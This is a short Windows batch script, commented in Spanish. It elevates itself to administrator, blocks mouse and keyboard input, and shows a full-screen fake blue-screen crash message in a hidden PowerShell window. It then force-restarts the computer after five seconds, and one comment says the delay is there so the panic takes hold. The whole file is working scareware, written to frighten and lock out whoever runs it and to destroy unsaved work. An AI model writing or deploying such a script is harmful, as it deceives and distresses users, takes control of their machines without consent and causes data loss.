@echo off
:: 1. Intentar obtener Admin rápido para el bloqueo total
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: 2. BLOQUEO INSTANTÁNEO DE RATÓN Y TECLADO
rundll32.exe user32.dll,BlockInput 1

:: 3. LANZAR PANTALLAZO AZUL A TODA PANTALLA (PowerShell)
start /min powershell -WindowStyle Hidden -Command "& {Add-Type -AssemblyName System.Windows.Forms, System.Drawing; $f = New-Object System.Windows.Forms.Form; $f.BackColor = 'Blue'; $f.WindowState = 'Maximized'; $f.FormBorderStyle = 'None'; $f.TopMost = $true; $f.Cursor = [System.Windows.Forms.Cursors]::None; $l = New-Object System.Windows.Forms.Label; $l.Text = ':(' + [char]10 + [char]10 + 'SE DETECTÓ UN ERROR CRÍTICO Y EL SISTEMA SE APAGARÁ' + [char]10 + 'PARA EVITAR DAÑOS PERMANENTES.' + [char]10 + [char]10 + 'Código de error: CHAMOI_FATAL_ERROR'; $l.ForeColor = 'White'; $l.Font = New-Object System.Drawing.Font('Segoe UI', 28, [System.Drawing.FontStyle]::Bold); $l.Dock = 'Fill'; $l.TextAlign = 'MiddleCenter'; $f.Controls.Add($l); $f.ShowDialog()}"

:: 4. ESPERA DE 5 SEGUNDOS (Para que el pánico haga su efecto)
timeout /t 5 /nobreak >nul

:: 5. REINICIO FORZOSO
shutdown /r /t 0 /f
